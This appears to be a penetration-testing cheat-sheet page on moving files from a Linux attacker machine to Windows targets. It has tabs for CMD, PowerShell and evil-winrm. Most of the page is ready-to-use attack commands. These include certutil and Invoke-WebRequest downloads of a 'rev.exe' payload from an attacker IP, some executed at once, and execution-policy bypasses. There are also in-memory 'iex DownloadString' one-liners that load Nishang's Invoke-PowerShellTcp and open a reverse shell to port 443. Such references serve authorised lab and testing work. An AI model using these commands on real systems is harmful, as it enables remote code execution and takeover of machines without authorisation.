---
title: "File Transfer (Linux to Windows)"
date: 2024-6-26
tags: ["file transfer", "Windows", "evil-winrm"]
---

---
{{< tab set1 tab1 active >}}CMD{{< /tab >}}
{{< tab set1 tab2 >}}Powershell{{< /tab >}}
{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start a Local HTTP Server

<div>

```bash
python3 -m http.server 80
```

</div>

<br>

<div>

```bash
certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe
```

```bash
# Upload and Run
certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe && C:\ProgramData\rev.exe
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Start a Local HTTP Server

<div>

```bash
python3 -m http.server 80
```

</div>

<br>

<div>

```powershell
# Long version
Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe
```

```powershell
# Short version
iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

<small>*Note: PowerShell 3.0+*</small>

</div>

<div>

```powershell
# Long version
powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

```powershell
# Short version
powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

<small>*Note: curl is not always available*</small>

</div>

<div>

```powershell
# Load into memory and Run
```

```powershell
# Long version
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

```powershell
# Short version
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

```powershell
# Combined version
iex (iwr http://10.10.14.10/rev.ps1)
```

<small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```bash
# Evil-winrm built-in function
upload "/tmp/example.txt" "C:\ProgramData\example.txt"
```

</div>

{{< /tabcontent >}}

<br>